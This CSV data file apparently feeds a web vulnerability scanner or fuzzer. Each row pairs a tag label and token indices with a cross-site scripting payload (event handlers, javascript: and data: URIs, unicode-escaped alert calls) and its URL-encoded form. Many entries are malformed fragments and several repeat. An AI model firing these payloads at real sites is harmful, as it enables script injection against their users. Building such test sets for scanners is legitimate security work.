body_tag,"[42, 16, 24, 69, 54]",src=saivs.js <input <svg <onload=alert();,src%3Dsaivs.js%20%3Cinput%20%3Csvg%20%3Conload%3Dalert%28%29%3B
body_tag,"[21, 70, 25, 36, 59]","<frameset><frame ""<svg/<embed/alert();",%3Cframeset%3E%3Cframe%20%22%3Csvg/%3Cembed/alert%28%29%3B
body_tag,"[47, 37, 56, 50, 52]",data=</embed>onmouseover=alert();onerror=al\u0065rt();javascript:\u0061lert();,data%3D%3C/embed%3Eonmouseover%3Dalert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3B
body_tag,"[49, 43, 21, 53, 18]","onerror=\u0061lert();type=""image"" <frameset><frame javascript:al\u0065rt();<iframe ",onerror%3D%5Cu0061lert%28%29%3Btype%3D%22image%22%20%3Cframeset%3E%3Cframe%20javascript%3Aal%5Cu0065rt%28%29%3B%3Ciframe%20
body_tag,"[71, 30, 36, 69, 39]",'<select/<embed/<src=/ ,%27%3Cselect/%3Cembed/%3Csrc%3D/%20
body_tag,"[29, 57, 52, 69, 37]",<select onerror=alert();javascript:\u0061lert();<</embed>,%3Cselect%20onerror%3Dalert%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3B%3C%3C/embed%3E
body_tag,"[58, 11, 39, 50, 10]",saivs.js <img src=/ onerror=al\u0065rt();<option/,saivs.js%20%3Cimg%20src%3D/%20onerror%3Dal%5Cu0065rt%28%29%3B%3Coption/
body_tag,"[41, 71, 43, 6, 26]","src=""data:text/html,'type=""image"" <a <object ",src%3D%22data%3Atext/html%2C%27type%3D%22image%22%20%3Ca%20%3Cobject%20
body_tag,"[42, 57, 63, 34, 13]",src=saivs.js onerror=alert();\u0061lert``;</canvas></img>,src%3Dsaivs.js%20onerror%3Dalert%28%29%3B%5Cu0061lert%60%60%3B%3C/canvas%3E%3C/img%3E
body_tag,"[51, 23, 38, 40, 69]",javascript:alert();</frameset>src=x src=  <,javascript%3Aalert%28%29%3B%3C/frameset%3Esrc%3Dx%20src%3D%20%20%3C
body_tag,"[24, 64, 56, 23, 34]",<svg al\u0065rt``;onmouseover=alert();</frameset></canvas>,%3Csvg%20al%5Cu0065rt%60%60%3Bonmouseover%3Dalert%28%29%3B%3C/frameset%3E%3C/canvas%3E
body_tag,"[56, 13, 29, 39, 9]",onmouseover=alert();</img><select src=/ <option ,onmouseover%3Dalert%28%29%3B%3C/img%3E%3Cselect%20src%3D/%20%3Coption%20
body_tag,"[10, 24, 23, 13, 19]",<option/<svg </frameset></img><iframe/,%3Coption/%3Csvg%20%3C/frameset%3E%3C/img%3E%3Ciframe/
body_tag,"[61, 29, 69, 69, 19]",al\u0065rt();<select <<<iframe/,al%5Cu0065rt%28%29%3B%3Cselect%20%3C%3C%3Ciframe/
body_tag,"[48, 35, 6, 47, 65]",onerror=javascript:alert();<embed <a data=confirm(1);,onerror%3Djavascript%3Aalert%28%29%3B%3Cembed%20%3Ca%20data%3Dconfirm%281%29%3B
body_tag,"[49, 57, 67, 10, 52]",onerror=\u0061lert();onerror=alert();><option/javascript:\u0061lert();,onerror%3D%5Cu0061lert%28%29%3Bonerror%3Dalert%28%29%3B%3E%3Coption/javascript%3A%5Cu0061lert%28%29%3B
body_tag,"[17, 49, 16, 43, 38]","<input/onerror=\u0061lert();<input type=""image"" src=x ",%3Cinput/onerror%3D%5Cu0061lert%28%29%3B%3Cinput%20type%3D%22image%22%20src%3Dx%20
body_tag,"[72, 2, 55, 58, 20]","#<video><source onload=alert();""saivs.js </iframe>",%23%3Cvideo%3E%3Csource%20onload%3Dalert%28%29%3B%22saivs.js%20%3C/iframe%3E
body_tag,"[34, 9, 11, 32, 54]",</canvas><option <img <canvas onload=alert();,%3C/canvas%3E%3Coption%20%3Cimg%20%3Ccanvas%20onload%3Dalert%28%29%3B
body_tag,"[22, 20, 31, 14, 74]",<frameset><frame/</iframe></select><body  ,%3Cframeset%3E%3Cframe/%3C/iframe%3E%3C/select%3E%3Cbody%20%20
body_tag,"[21, 70, 25, 36, 59]","<frameset><frame ""<svg/<embed/alert();",%3Cframeset%3E%3Cframe%20%22%3Csvg/%3Cembed/alert%28%29%3B
body_tag,"[41, 13, 25, 45, 18]","src=""data:text/html,</img><svg/data=saivs.html <iframe ",src%3D%22data%3Atext/html%2C%3C/img%3E%3Csvg/data%3Dsaivs.html%20%3Ciframe%20
body_tag,"[43, 50, 14, 3, 34]","type=""image"" onerror=al\u0065rt();<body <video><source/</canvas>",type%3D%22image%22%20onerror%3Dal%5Cu0065rt%28%29%3B%3Cbody%20%3Cvideo%3E%3Csource/%3C/canvas%3E
body_tag,"[69, 53, 15, 31, 53]",<javascript:al\u0065rt();<body/</select>javascript:al\u0065rt();,%3Cjavascript%3Aal%5Cu0065rt%28%29%3B%3Cbody/%3C/select%3Ejavascript%3Aal%5Cu0065rt%28%29%3B
body_tag,"[15, 23, 6, 52, 37]",<body/</frameset><a javascript:\u0061lert();</embed>,%3Cbody/%3C/frameset%3E%3Ca%20javascript%3A%5Cu0061lert%28%29%3B%3C/embed%3E
body_tag,"[56, 13, 29, 39, 9]",onmouseover=alert();</img><select src=/ <option ,onmouseover%3Dalert%28%29%3B%3C/img%3E%3Cselect%20src%3D/%20%3Coption%20
body_tag,"[42, 16, 24, 69, 54]",src=saivs.js <input <svg <onload=alert();,src%3Dsaivs.js%20%3Cinput%20%3Csvg%20%3Conload%3Dalert%28%29%3B
body_tag,"[10, 24, 23, 13, 19]",<option/<svg </frameset></img><iframe/,%3Coption/%3Csvg%20%3C/frameset%3E%3C/img%3E%3Ciframe/
body_tag,"[5, 3, 39, 6, 17]",<script/<video><source/src=/ <a <input/,%3Cscript/%3Cvideo%3E%3Csource/src%3D/%20%3Ca%20%3Cinput/
body_tag,"[56, 10, 21, 37, 31]",onmouseover=alert();<option/<frameset><frame </embed></select>,onmouseover%3Dalert%28%29%3B%3Coption/%3Cframeset%3E%3Cframe%20%3C/embed%3E%3C/select%3E
body_tag,"[33, 27, 62, 45, 15]",<canvas/<object/alert``;data=saivs.html <body/,%3Ccanvas/%3Cobject/alert%60%60%3Bdata%3Dsaivs.html%20%3Cbody/
body_tag,"[65, 17, 46, 64, 61]","confirm(1);<input/data=""data:text/html,al\u0065rt``;al\u0065rt();",confirm%281%29%3B%3Cinput/data%3D%22data%3Atext/html%2Cal%5Cu0065rt%60%60%3Bal%5Cu0065rt%28%29%3B
body_tag,"[60, 66, 71, 49, 39]",\u0061lert();prompt(1);'onerror=\u0061lert();src=/ ,%5Cu0061lert%28%29%3Bprompt%281%29%3B%27onerror%3D%5Cu0061lert%28%29%3Bsrc%3D/%20
body_tag,"[31, 34, 25, 18, 73]",</select></canvas><svg/<iframe /,%3C/select%3E%3C/canvas%3E%3Csvg/%3Ciframe%20/
body_tag,"[64, 40, 35, 16, 66]",al\u0065rt``;src=  <embed <input prompt(1);,al%5Cu0065rt%60%60%3Bsrc%3D%20%20%3Cembed%20%3Cinput%20prompt%281%29%3B
body_tag,"[73, 64, 20, 32, 32]",/al\u0065rt``;</iframe><canvas <canvas ,/al%5Cu0065rt%60%60%3B%3C/iframe%3E%3Ccanvas%20%3Ccanvas%20
body_tag,"[69, 65, 14, 70, 4]","<confirm(1);<body ""<script ",%3Cconfirm%281%29%3B%3Cbody%20%22%3Cscript%20
body_tag,"[48, 39, 1, 69, 10]",onerror=javascript:alert();src=/ </script><<option/,onerror%3Djavascript%3Aalert%28%29%3Bsrc%3D/%20%3C/script%3E%3C%3Coption/
body_tag,"[29, 57, 52, 69, 37]",<select onerror=alert();javascript:\u0061lert();<</embed>,%3Cselect%20onerror%3Dalert%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3B%3C%3C/embed%3E
body_tag,"[72, 40, 17, 58, 20]",#src=  <input/saivs.js </iframe>,%23src%3D%20%20%3Cinput/saivs.js%20%3C/iframe%3E
body_tag,"[56, 58, 2, 64, 25]",onmouseover=alert();saivs.js <video><source al\u0065rt``;<svg/,onmouseover%3Dalert%28%29%3Bsaivs.js%20%3Cvideo%3E%3Csource%20al%5Cu0065rt%60%60%3B%3Csvg/
body_tag,"[24, 55, 53, 35, 3]","<svg onload=alert();""javascript:al\u0065rt();<embed <video><source/",%3Csvg%20onload%3Dalert%28%29%3B%22javascript%3Aal%5Cu0065rt%28%29%3B%3Cembed%20%3Cvideo%3E%3Csource/
body_tag,"[24, 52, 66, 35, 41]","<svg javascript:\u0061lert();prompt(1);<embed src=""data:text/html,",%3Csvg%20javascript%3A%5Cu0061lert%28%29%3Bprompt%281%29%3B%3Cembed%20src%3D%22data%3Atext/html%2C
body_tag,"[53, 72, 49, 50, 64]",javascript:al\u0065rt();#onerror=\u0061lert();onerror=al\u0065rt();al\u0065rt``;,javascript%3Aal%5Cu0065rt%28%29%3B%23onerror%3D%5Cu0061lert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3Bal%5Cu0065rt%60%60%3B
body_tag,"[51, 23, 38, 40, 69]",javascript:alert();</frameset>src=x src=  <,javascript%3Aalert%28%29%3B%3C/frameset%3Esrc%3Dx%20src%3D%20%20%3C
body_tag,"[49, 43, 21, 53, 18]","onerror=\u0061lert();type=""image"" <frameset><frame javascript:al\u0065rt();<iframe ",onerror%3D%5Cu0061lert%28%29%3Btype%3D%22image%22%20%3Cframeset%3E%3Cframe%20javascript%3Aal%5Cu0065rt%28%29%3B%3Ciframe%20
body_tag,"[11, 70, 43, 6, 20]","<img ""type=""image"" <a </iframe>",%3Cimg%20%22type%3D%22image%22%20%3Ca%20%3C/iframe%3E
body_tag,"[49, 43, 21, 53, 18]","onerror=\u0061lert();type=""image"" <frameset><frame javascript:al\u0065rt();<iframe ",onerror%3D%5Cu0061lert%28%29%3Btype%3D%22image%22%20%3Cframeset%3E%3Cframe%20javascript%3Aal%5Cu0065rt%28%29%3B%3Ciframe%20
body_tag,"[11, 70, 43, 6, 20]","<img ""type=""image"" <a </iframe>",%3Cimg%20%22type%3D%22image%22%20%3Ca%20%3C/iframe%3E
body_tag,"[68, 9, 34, 37, 32]", /><option </canvas></embed><canvas ,%20/%3E%3Coption%20%3C/canvas%3E%3C/embed%3E%3Ccanvas%20
body_tag,"[51, 23, 38, 40, 69]",javascript:alert();</frameset>src=x src=  <,javascript%3Aalert%28%29%3B%3C/frameset%3Esrc%3Dx%20src%3D%20%20%3C
body_tag,"[56, 58, 2, 64, 25]",onmouseover=alert();saivs.js <video><source al\u0065rt``;<svg/,onmouseover%3Dalert%28%29%3Bsaivs.js%20%3Cvideo%3E%3Csource%20al%5Cu0065rt%60%60%3B%3Csvg/
body_tag,"[24, 55, 53, 35, 3]","<svg onload=alert();""javascript:al\u0065rt();<embed <video><source/",%3Csvg%20onload%3Dalert%28%29%3B%22javascript%3Aal%5Cu0065rt%28%29%3B%3Cembed%20%3Cvideo%3E%3Csource/
body_tag,"[24, 52, 66, 35, 41]","<svg javascript:\u0061lert();prompt(1);<embed src=""data:text/html,",%3Csvg%20javascript%3A%5Cu0061lert%28%29%3Bprompt%281%29%3B%3Cembed%20src%3D%22data%3Atext/html%2C
body_tag,"[53, 72, 49, 50, 64]",javascript:al\u0065rt();#onerror=\u0061lert();onerror=al\u0065rt();al\u0065rt``;,javascript%3Aal%5Cu0065rt%28%29%3B%23onerror%3D%5Cu0061lert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3Bal%5Cu0065rt%60%60%3B
body_tag,"[49, 9, 15, 38, 54]",onerror=\u0061lert();<option <body/src=x onload=alert();,onerror%3D%5Cu0061lert%28%29%3B%3Coption%20%3Cbody/src%3Dx%20onload%3Dalert%28%29%3B
body_tag,"[48, 39, 1, 69, 10]",onerror=javascript:alert();src=/ </script><<option/,onerror%3Djavascript%3Aalert%28%29%3Bsrc%3D/%20%3C/script%3E%3C%3Coption/
body_tag,"[29, 57, 52, 69, 37]",<select onerror=alert();javascript:\u0061lert();<</embed>,%3Cselect%20onerror%3Dalert%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3B%3C%3C/embed%3E
body_tag,"[72, 40, 17, 58, 20]",#src=  <input/saivs.js </iframe>,%23src%3D%20%20%3Cinput/saivs.js%20%3C/iframe%3E
body_tag,"[64, 40, 35, 16, 66]",al\u0065rt``;src=  <embed <input prompt(1);,al%5Cu0065rt%60%60%3Bsrc%3D%20%20%3Cembed%20%3Cinput%20prompt%281%29%3B
body_tag,"[73, 64, 20, 32, 32]",/al\u0065rt``;</iframe><canvas <canvas ,/al%5Cu0065rt%60%60%3B%3C/iframe%3E%3Ccanvas%20%3Ccanvas%20
body_tag,"[69, 65, 14, 70, 4]","<confirm(1);<body ""<script ",%3Cconfirm%281%29%3B%3Cbody%20%22%3Cscript%20
body_tag,"[33, 27, 62, 45, 15]",<canvas/<object/alert``;data=saivs.html <body/,%3Ccanvas/%3Cobject/alert%60%60%3Bdata%3Dsaivs.html%20%3Cbody/
body_tag,"[65, 17, 46, 64, 61]","confirm(1);<input/data=""data:text/html,al\u0065rt``;al\u0065rt();",confirm%281%29%3B%3Cinput/data%3D%22data%3Atext/html%2Cal%5Cu0065rt%60%60%3Bal%5Cu0065rt%28%29%3B
body_tag,"[65, 43, 21, 64, 61]","confirm(1);type=""image"" <frameset><frame al\u0065rt``;al\u0065rt();",confirm%281%29%3Btype%3D%22image%22%20%3Cframeset%3E%3Cframe%20al%5Cu0065rt%60%60%3Bal%5Cu0065rt%28%29%3B
body_tag,"[49, 17, 46, 53, 18]","onerror=\u0061lert();<input/data=""data:text/html,javascript:al\u0065rt();<iframe ",onerror%3D%5Cu0061lert%28%29%3B%3Cinput/data%3D%22data%3Atext/html%2Cjavascript%3Aal%5Cu0065rt%28%29%3B%3Ciframe%20
body_tag,"[24, 64, 21, 53, 18]",<svg al\u0065rt``;<frameset><frame javascript:al\u0065rt();<iframe ,%3Csvg%20al%5Cu0065rt%60%60%3B%3Cframeset%3E%3Cframe%20javascript%3Aal%5Cu0065rt%28%29%3B%3Ciframe%20
body_tag,"[0, 60, 56, 23, 72]",<script>\u0061lert();onmouseover=alert();</frameset>#,%3Cscript%3E%5Cu0061lert%28%29%3Bonmouseover%3Dalert%28%29%3B%3C/frameset%3E%23
body_tag,"[24, 64, 56, 23, 34]",<svg al\u0065rt``;onmouseover=alert();</frameset></canvas>,%3Csvg%20al%5Cu0065rt%60%60%3Bonmouseover%3Dalert%28%29%3B%3C/frameset%3E%3C/canvas%3E
body_tag,"[21, 41, 34, 73, 32]","<frameset><frame src=""data:text/html,</canvas>/<canvas ",%3Cframeset%3E%3Cframe%20src%3D%22data%3Atext/html%2C%3C/canvas%3E/%3Ccanvas%20
body_tag,"[13, 9, 34, 37, 8]",</img><option </canvas></embed></a>,%3C/img%3E%3Coption%20%3C/canvas%3E%3C/embed%3E%3C/a%3E
body_tag,"[51, 65, 38, 9, 21]",javascript:alert();confirm(1);src=x <option <frameset><frame ,javascript%3Aalert%28%29%3Bconfirm%281%29%3Bsrc%3Dx%20%3Coption%20%3Cframeset%3E%3Cframe%20
body_tag,"[51, 23, 70, 61, 31]","javascript:alert();</frameset>""al\u0065rt();</select>",javascript%3Aalert%28%29%3B%3C/frameset%3E%22al%5Cu0065rt%28%29%3B%3C/select%3E
body_tag,"[56, 51, 2, 64, 41]","onmouseover=alert();javascript:alert();<video><source al\u0065rt``;src=""data:text/html,",onmouseover%3Dalert%28%29%3Bjavascript%3Aalert%28%29%3B%3Cvideo%3E%3Csource%20al%5Cu0065rt%60%60%3Bsrc%3D%22data%3Atext/html%2C
body_tag,"[24, 55, 2, 64, 41]","<svg onload=alert();""<video><source al\u0065rt``;src=""data:text/html,",%3Csvg%20onload%3Dalert%28%29%3B%22%3Cvideo%3E%3Csource%20al%5Cu0065rt%60%60%3Bsrc%3D%22data%3Atext/html%2C
body_tag,"[24, 55, 53, 35, 64]","<svg onload=alert();""javascript:al\u0065rt();<embed al\u0065rt``;",%3Csvg%20onload%3Dalert%28%29%3B%22javascript%3Aal%5Cu0065rt%28%29%3B%3Cembed%20al%5Cu0065rt%60%60%3B
body_tag,"[3, 2, 8, 35, 3]",<video><source/<video><source </a><embed <video><source/,%3Cvideo%3E%3Csource/%3Cvideo%3E%3Csource%20%3C/a%3E%3Cembed%20%3Cvideo%3E%3Csource/
body_tag,"[3, 33, 15, 7, 5]",<video><source/<canvas/<body/<a/<script/,%3Cvideo%3E%3Csource/%3Ccanvas/%3Cbody/%3Ca/%3Cscript/
body_tag,"[55, 12, 56, 50, 52]","onload=alert();""<img/onmouseover=alert();onerror=al\u0065rt();javascript:\u0061lert();",onload%3Dalert%28%29%3B%22%3Cimg/onmouseover%3Dalert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3B
body_tag,"[47, 37, 56, 50, 52]",data=</embed>onmouseover=alert();onerror=al\u0065rt();javascript:\u0061lert();,data%3D%3C/embed%3Eonmouseover%3Dalert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3B
body_tag,"[71, 30, 36, 69, 39]",'<select/<embed/<src=/ ,%27%3Cselect/%3Cembed/%3Csrc%3D/%20
body_tag,"[42, 57, 63, 34, 13]",src=saivs.js onerror=alert();\u0061lert``;</canvas></img>,src%3Dsaivs.js%20onerror%3Dalert%28%29%3B%5Cu0061lert%60%60%3B%3C/canvas%3E%3C/img%3E
body_tag,"[15, 9, 64, 38, 70]","<body/<option al\u0065rt``;src=x """,%3Cbody/%3Coption%20al%5Cu0065rt%60%60%3Bsrc%3Dx%20%22
body_tag,"[15, 9, 64, 25, 10]",<body/<option al\u0065rt``;<svg/<option/,%3Cbody/%3Coption%20al%5Cu0065rt%60%60%3B%3Csvg/%3Coption/
body_tag,"[48, 39, 1, 69, 70]","onerror=javascript:alert();src=/ </script><""",onerror%3Djavascript%3Aalert%28%29%3Bsrc%3D/%20%3C/script%3E%3C%22
body_tag,"[48, 1, 53, 59, 37]",onerror=javascript:alert();</script>javascript:al\u0065rt();alert();</embed>,onerror%3Djavascript%3Aalert%28%29%3B%3C/script%3Ejavascript%3Aal%5Cu0065rt%28%29%3Balert%28%29%3B%3C/embed%3E
body_tag,"[29, 57, 1, 69, 10]",<select onerror=alert();</script><<option/,%3Cselect%20onerror%3Dalert%28%29%3B%3C/script%3E%3C%3Coption/
body_tag,"[29, 57, 44, 6, 32]","<select onerror=alert();type=""text/x-scriptlet"" <a <canvas ",%3Cselect%20onerror%3Dalert%28%29%3Btype%3D%22text/x-scriptlet%22%20%3Ca%20%3Ccanvas%20
body_tag,"[41, 71, 43, 6, 37]","src=""data:text/html,'type=""image"" <a </embed>",src%3D%22data%3Atext/html%2C%27type%3D%22image%22%20%3Ca%20%3C/embed%3E
body_tag,"[0, 71, 43, 6, 26]","<script>'type=""image"" <a <object ",%3Cscript%3E%27type%3D%22image%22%20%3Ca%20%3Cobject%20
body_tag,"[41, 40, 68, 73, 20]","src=""data:text/html,src=   />/</iframe>",src%3D%22data%3Atext/html%2Csrc%3D%20%20%20/%3E/%3C/iframe%3E
body_tag,"[74, 45, 46, 73, 20]"," data=saivs.html data=""data:text/html,/</iframe>",%20data%3Dsaivs.html%20data%3D%22data%3Atext/html%2C/%3C/iframe%3E
body_tag,"[73, 64, 70, 73, 32]","/al\u0065rt``;""/<canvas ",/al%5Cu0065rt%60%60%3B%22/%3Ccanvas%20
body_tag,"[69, 65, 14, 70, 32]","<confirm(1);<body ""<canvas ",%3Cconfirm%281%29%3B%3Cbody%20%22%3Ccanvas%20
body_tag,"[69, 65, 14, 70, 4]","<confirm(1);<body ""<script ",%3Cconfirm%281%29%3B%3Cbody%20%22%3Cscript%20
body_tag,"[49, 51, 18, 59, 35]",onerror=\u0061lert();javascript:alert();<iframe alert();<embed ,onerror%3D%5Cu0061lert%28%29%3Bjavascript%3Aalert%28%29%3B%3Ciframe%20alert%28%29%3B%3Cembed%20
body_tag,"[13, 10, 18, 64, 35]",</img><option/<iframe al\u0065rt``;<embed ,%3C/img%3E%3Coption/%3Ciframe%20al%5Cu0065rt%60%60%3B%3Cembed%20
body_tag,"[65, 17, 46, 59, 61]","confirm(1);<input/data=""data:text/html,alert();al\u0065rt();",confirm%281%29%3B%3Cinput/data%3D%22data%3Atext/html%2Calert%28%29%3Bal%5Cu0065rt%28%29%3B
body_tag,"[54, 40, 72, 44, 11]","onload=alert();src=  #type=""text/x-scriptlet"" <img ",onload%3Dalert%28%29%3Bsrc%3D%20%20%23type%3D%22text/x-scriptlet%22%20%3Cimg%20
body_tag,"[12, 49, 2, 8, 46]","<img/onerror=\u0061lert();<video><source </a>data=""data:text/html,",%3Cimg/onerror%3D%5Cu0061lert%28%29%3B%3Cvideo%3E%3Csource%20%3C/a%3Edata%3D%22data%3Atext/html%2C
body_tag,"[25, 35, 60, 20, 12]",<svg/<embed \u0061lert();</iframe><img/,%3Csvg/%3Cembed%20%5Cu0061lert%28%29%3B%3C/iframe%3E%3Cimg/
body_tag,"[22, 36, 57, 18, 20]",<frameset><frame/<embed/onerror=alert();<iframe </iframe>,%3Cframeset%3E%3Cframe/%3Cembed/onerror%3Dalert%28%29%3B%3Ciframe%20%3C/iframe%3E
body_tag,"[14, 51, 10, 49, 3]",<body javascript:alert();<option/onerror=\u0061lert();<video><source/,%3Cbody%20javascript%3Aalert%28%29%3B%3Coption/onerror%3D%5Cu0061lert%28%29%3B%3Cvideo%3E%3Csource/
body_tag,"[48, 15, 20, 73, 18]",onerror=javascript:alert();<body/</iframe>/<iframe ,onerror%3Djavascript%3Aalert%28%29%3B%3Cbody/%3C/iframe%3E/%3Ciframe%20
body_tag,"[19, 51, 72, 6, 69]",<iframe/javascript:alert();#<a <,%3Ciframe/javascript%3Aalert%28%29%3B%23%3Ca%20%3C
body_tag,"[62, 36, 9, 55, 53]","alert``;<embed/<option onload=alert();""javascript:al\u0065rt();",alert%60%60%3B%3Cembed/%3Coption%20onload%3Dalert%28%29%3B%22javascript%3Aal%5Cu0065rt%28%29%3B
body_tag,"[40, 63, 65, 42, 48]",src=  \u0061lert``;confirm(1);src=saivs.js onerror=javascript:alert();,src%3D%20%20%5Cu0061lert%60%60%3Bconfirm%281%29%3Bsrc%3Dsaivs.js%20onerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[31, 10, 18, 43, 45]","</select><option/<iframe type=""image"" data=saivs.html ",%3C/select%3E%3Coption/%3Ciframe%20type%3D%22image%22%20data%3Dsaivs.html%20
body_tag,"[56, 31, 73, 68, 23]",onmouseover=alert();</select>/ /></frameset>,onmouseover%3Dalert%28%29%3B%3C/select%3E/%20/%3E%3C/frameset%3E
body_tag,"[0, 16, 44, 10, 67]","<script><input type=""text/x-scriptlet"" <option/>",%3Cscript%3E%3Cinput%20type%3D%22text/x-scriptlet%22%20%3Coption/%3E
body_tag,"[16, 19, 30, 10, 71]",<input <iframe/<select/<option/',%3Cinput%20%3Ciframe/%3Cselect/%3Coption/%27
body_tag,"[0, 61, 52, 57, 56]",<script>al\u0065rt();javascript:\u0061lert();onerror=alert();onmouseover=alert();,%3Cscript%3Eal%5Cu0065rt%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3Bonerror%3Dalert%28%29%3Bonmouseover%3Dalert%28%29%3B
body_tag,"[72, 21, 19, 1, 7]",#<frameset><frame <iframe/</script><a/,%23%3Cframeset%3E%3Cframe%20%3Ciframe/%3C/script%3E%3Ca/
body_tag,"[22, 72, 39, 56, 15]",<frameset><frame/#src=/ onmouseover=alert();<body/,%3Cframeset%3E%3Cframe/%23src%3D/%20onmouseover%3Dalert%28%29%3B%3Cbody/
body_tag,"[11, 0, 31, 45, 16]",<img <script></select>data=saivs.html <input ,%3Cimg%20%3Cscript%3E%3C/select%3Edata%3Dsaivs.html%20%3Cinput%20
body_tag,"[70, 68, 14, 44, 55]",""" /><body type=""text/x-scriptlet"" onload=alert();""",%22%20/%3E%3Cbody%20type%3D%22text/x-scriptlet%22%20onload%3Dalert%28%29%3B%22
body_tag,"[22, 8, 38, 74, 11]",<frameset><frame/</a>src=x  <img ,%3Cframeset%3E%3Cframe/%3C/a%3Esrc%3Dx%20%20%3Cimg%20
body_tag,"[67, 12, 54, 17, 47]",><img/onload=alert();<input/data=,%3E%3Cimg/onload%3Dalert%28%29%3B%3Cinput/data%3D
body_tag,"[44, 49, 60, 24, 39]","type=""text/x-scriptlet"" onerror=\u0061lert();\u0061lert();<svg src=/ ",type%3D%22text/x-scriptlet%22%20onerror%3D%5Cu0061lert%28%29%3B%5Cu0061lert%28%29%3B%3Csvg%20src%3D/%20
body_tag,"[19, 17, 28, 74, 21]",<iframe/<input/</object> <frameset><frame ,%3Ciframe/%3Cinput/%3C/object%3E%20%3Cframeset%3E%3Cframe%20
body_tag,"[24, 23, 65, 25, 29]",<svg </frameset>confirm(1);<svg/<select ,%3Csvg%20%3C/frameset%3Econfirm%281%29%3B%3Csvg/%3Cselect%20
body_tag,"[6, 34, 43, 33, 59]","<a </canvas>type=""image"" <canvas/alert();",%3Ca%20%3C/canvas%3Etype%3D%22image%22%20%3Ccanvas/alert%28%29%3B
body_tag,"[72, 45, 45, 8, 45]",#data=saivs.html data=saivs.html </a>data=saivs.html ,%23data%3Dsaivs.html%20data%3Dsaivs.html%20%3C/a%3Edata%3Dsaivs.html%20
body_tag,"[63, 3, 24, 6, 54]",\u0061lert``;<video><source/<svg <a onload=alert();,%5Cu0061lert%60%60%3B%3Cvideo%3E%3Csource/%3Csvg%20%3Ca%20onload%3Dalert%28%29%3B
body_tag,"[49, 74, 25, 59, 21]",onerror=\u0061lert(); <svg/alert();<frameset><frame ,onerror%3D%5Cu0061lert%28%29%3B%20%3Csvg/alert%28%29%3B%3Cframeset%3E%3Cframe%20
body_tag,"[46, 29, 5, 55, 50]","data=""data:text/html,<select <script/onload=alert();""onerror=al\u0065rt();",data%3D%22data%3Atext/html%2C%3Cselect%20%3Cscript/onload%3Dalert%28%29%3B%22onerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[22, 45, 23, 66, 69]",<frameset><frame/data=saivs.html </frameset>prompt(1);<,%3Cframeset%3E%3Cframe/data%3Dsaivs.html%20%3C/frameset%3Eprompt%281%29%3B%3C
body_tag,"[8, 9, 37, 59, 72]",</a><option </embed>alert();#,%3C/a%3E%3Coption%20%3C/embed%3Ealert%28%29%3B%23
body_tag,"[5, 35, 13, 35, 1]",<script/<embed </img><embed </script>,%3Cscript/%3Cembed%20%3C/img%3E%3Cembed%20%3C/script%3E
body_tag,"[60, 49, 51, 28, 44]","\u0061lert();onerror=\u0061lert();javascript:alert();</object>type=""text/x-scriptlet"" ",%5Cu0061lert%28%29%3Bonerror%3D%5Cu0061lert%28%29%3Bjavascript%3Aalert%28%29%3B%3C/object%3Etype%3D%22text/x-scriptlet%22%20
body_tag,"[62, 14, 66, 19, 39]",alert``;<body prompt(1);<iframe/src=/ ,alert%60%60%3B%3Cbody%20prompt%281%29%3B%3Ciframe/src%3D/%20
body_tag,"[29, 32, 59, 26, 7]",<select <canvas alert();<object <a/,%3Cselect%20%3Ccanvas%20alert%28%29%3B%3Cobject%20%3Ca/
body_tag,"[17, 45, 71, 73, 66]",<input/data=saivs.html '/prompt(1);,%3Cinput/data%3Dsaivs.html%20%27/prompt%281%29%3B
body_tag,"[28, 59, 43, 39, 62]","</object>alert();type=""image"" src=/ alert``;",%3C/object%3Ealert%28%29%3Btype%3D%22image%22%20src%3D/%20alert%60%60%3B
body_tag,"[33, 2, 2, 47, 49]",<canvas/<video><source <video><source data=onerror=\u0061lert();,%3Ccanvas/%3Cvideo%3E%3Csource%20%3Cvideo%3E%3Csource%20data%3Donerror%3D%5Cu0061lert%28%29%3B
